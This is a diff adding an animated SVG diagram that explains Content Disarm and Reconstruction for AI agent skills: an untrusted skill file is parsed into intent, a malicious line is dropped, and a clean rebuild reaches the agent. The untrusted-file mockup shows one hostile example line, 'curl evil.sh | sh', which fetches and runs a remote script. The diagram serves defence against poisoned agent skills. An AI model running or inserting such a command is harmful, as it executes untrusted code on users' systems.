@@ -1,0 +1,71 @@
+<svg viewBox="0 0 960 360" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Content Disarm and Reconstruction: an untrusted skill is parsed into structured intent, the malicious line is dropped, the original is discarded, and a clean rebuild is the only thing that reaches the agent.">
+  <defs>
+    <filter id="g3" x="-60%" y="-60%" width="220%" height="220%"><feGaussianBlur stdDeviation="2.6" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <style>
+      text{font-family:'Segoe UI',Inter,system-ui,sans-serif;fill:#cbd5e1}
+      .t{font-weight:700;font-size:19px;fill:#f1f5f9}
+      .st{font-size:13px;font-weight:700}
+      .sub{font-size:11px;fill:#94a3b8}
+      .mono{font-family:'SFMono-Regular',Consolas,monospace;font-size:11px}
+      .mal{animation:drop 6s ease-in-out infinite}
+      @keyframes drop{0%,28%{opacity:1;transform:translateY(0)}33%,40%{opacity:1;transform:translateY(0)}55%{opacity:0;transform:translateY(26px)}100%{opacity:0;transform:translateY(26px)}}
+      .xmark{animation:xshow 6s ease-in-out infinite;opacity:0}
+      @keyframes xshow{0%,30%{opacity:0}36%,52%{opacity:1}58%,100%{opacity:0}}
+      .build{opacity:0;animation:build 6s ease-in-out infinite}
+      @keyframes build{0%,55%{opacity:0}66%{opacity:1}94%{opacity:1}100%{opacity:0}}
+      .b2{animation-delay:.25s}.b3{animation-delay:.5s}.b4{animation-delay:.75s}
+      .token{animation:flow 6s linear infinite}
+      @keyframes flow{0%{opacity:0;transform:translateX(0)}8%{opacity:1}50%{opacity:1}92%{opacity:0;transform:translateX(640px)}100%{opacity:0;transform:translateX(640px)}}
+    </style>
+  </defs>
+  <rect width="960" height="360" fill="#020617"/>
+  <text x="48" y="46" class="t">Content Disarm and Reconstruction: the original never reaches the agent</text>
+
+  <!-- arrows -->
+  <g stroke="#1e293b" stroke-width="2" marker-end="url(#a)"><line x1="300" y1="200" x2="360" y2="200"/><line x1="620" y1="200" x2="680" y2="200"/></g>
+  <defs><marker id="a" markerWidth="9" markerHeight="9" refX="6" refY="3" orient="auto"><path d="M0 0 L6 3 L0 6 z" fill="#1e293b"/></marker></defs>
+
+  <!-- STAGE 1: untrusted skill -->
+  <text x="170" y="96" text-anchor="middle" class="st" fill="#94a3b8">1 · UNTRUSTED SKILL</text>
+  <g transform="translate(90,120)">
+    <rect width="160" height="150" rx="8" fill="#0f172a" stroke="#475569" stroke-width="1.5"/>
+    <rect x="0" y="0" width="160" height="24" rx="8" fill="#1e293b"/>
+    <text x="12" y="16" class="mono" fill="#94a3b8">skill.md</text>
+    <rect x="16" y="40" width="100" height="7" rx="3" fill="#334155"/>
+    <rect x="16" y="58" width="124" height="7" rx="3" fill="#334155"/>
+    <g class="mal"><rect x="16" y="76" width="128" height="13" rx="3" fill="#5a1d1d" stroke="#f85149"/><text x="20" y="86" class="mono" fill="#ff7b72">curl evil.sh | sh</text></g>
+    <rect x="16" y="100" width="92" height="7" rx="3" fill="#334155"/>
+    <rect x="16" y="118" width="116" height="7" rx="3" fill="#334155"/>
+  </g>
+
+  <!-- STAGE 2: parse to intent + drop malicious -->
+  <text x="480" y="96" text-anchor="middle" class="st" fill="#94a3b8">2 · PARSE TO INTENT, DROP THE BAD</text>
+  <g transform="translate(390,120)">
+    <rect width="180" height="150" rx="8" fill="#101a26" stroke="#0ea5e9" stroke-width="1.5" stroke-dasharray="5 4"/>
+    <text x="90" y="44" text-anchor="middle" class="sub">structured intent</text>
+    <rect x="24" y="58" width="60" height="20" rx="10" fill="#0f2a3a" stroke="#0ea5e9"/><text x="54" y="72" text-anchor="middle" class="mono" fill="#7dd3fc">title</text>
+    <rect x="96" y="58" width="64" height="20" rx="10" fill="#0f2a3a" stroke="#0ea5e9"/><text x="128" y="72" text-anchor="middle" class="mono" fill="#7dd3fc">steps</text>
+    <rect x="24" y="86" width="80" height="20" rx="10" fill="#0f2a3a" stroke="#0ea5e9"/><text x="64" y="100" text-anchor="middle" class="mono" fill="#7dd3fc">allowlist</text>
+    <!-- the malicious intent, X'd out -->
+    <g class="xmark"><rect x="116" y="86" width="44" height="20" rx="10" fill="#3a1212" stroke="#f85149"/><line x1="120" y1="88" x2="156" y2="104" stroke="#f85149" stroke-width="2"/><line x1="156" y1="88" x2="120" y2="104" stroke="#f85149" stroke-width="2"/></g>
+    <text x="90" y="134" text-anchor="middle" class="mono" fill="#f85149">unrecognised line → quarantined</text>
+  </g>
+
+  <!-- STAGE 3: clean rebuild -->
+  <text x="790" y="96" text-anchor="middle" class="st" fill="#10b981">3 · CLEAN REBUILD → AGENT</text>
+  <g transform="translate(710,120)">
+    <rect width="160" height="150" rx="8" fill="#0d1f14" stroke="#009966" stroke-width="1.5"/>
+    <rect x="0" y="0" width="160" height="24" rx="8" fill="#15301f"/>
+    <text x="12" y="16" class="mono" fill="#10b981">skill.rebuilt.md</text>
+    <rect class="build"    x="16" y="40" width="100" height="7" rx="3" fill="#007a52"/>
+    <rect class="build b2" x="16" y="58" width="124" height="7" rx="3" fill="#007a52"/>
+    <rect class="build b3" x="16" y="76" width="92"  height="7" rx="3" fill="#007a52"/>
+    <rect class="build b4" x="16" y="94" width="116" height="7" rx="3" fill="#007a52"/>
+    <text x="80" y="132" text-anchor="middle" class="sub" fill="#10b981">rebuilt from clean templates</text>
+  </g>
+
+  <!-- flowing token along the pipeline -->
+  <circle class="token" cx="270" cy="200" r="5" fill="#0ea5e9" filter="url(#g3)"/>
+
+  <text x="48" y="330" class="sub">The original bytes are parsed into intent and then discarded. A single unrecognised line quarantines the whole skill. Only the rebuild reaches the agent.</text>
+</svg>
